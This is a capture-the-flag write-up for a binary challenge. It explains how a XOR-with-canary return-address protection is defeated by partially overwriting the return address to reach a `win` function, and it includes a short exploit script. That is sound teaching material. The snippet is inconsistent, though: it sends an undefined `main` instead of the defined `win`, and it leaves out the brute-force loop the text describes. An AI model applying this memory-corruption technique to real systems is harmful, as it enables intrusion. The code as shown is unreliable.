# ptr_protection
The goal is to read the flag.

## Context
- The binary allows the user to write an integer at a given index, until a negative index is provided.
- The binary uses a return address protection mechanism by XORing it with a canary value. This XOR happens twice: once at the start of the function and again just before returning, ensuring the return address is "protected" against tampering.

## Approach
By disassembling the executable, I identified the `win` function. The strategy is to overwrite the return address with the address of `win`. 
```{python}
win = 0x7c
c.recvuntil(b'index: ')
c.sendline(b'40')
c.recvuntil(b'data: ')
c.sendline(bytes(str(main), 'utf-8'))
c.recvuntil(b'index: ')
c.sendline(b'41')
c.recvuntil(b'data: ')
c.sendline(bytes(str(0x00), 'utf-8'))
c.recvuntil(b'index: ')
c.sendline(b'-1')
print(c.recv()) 
```

- Since the last two nibbles of the canary are 0x00, it means that the corresponding byte of the return address is not modified by the XOR operation.
- I overwrite the last two nibbles of the return address with those of `win`.
- Since the binary was compiled with PIE enabled, the memory addresses are randomized. To overcome this I made a loop to bruteforce the second-last nibbles of the return address, ensuring a successful jump to the win function.
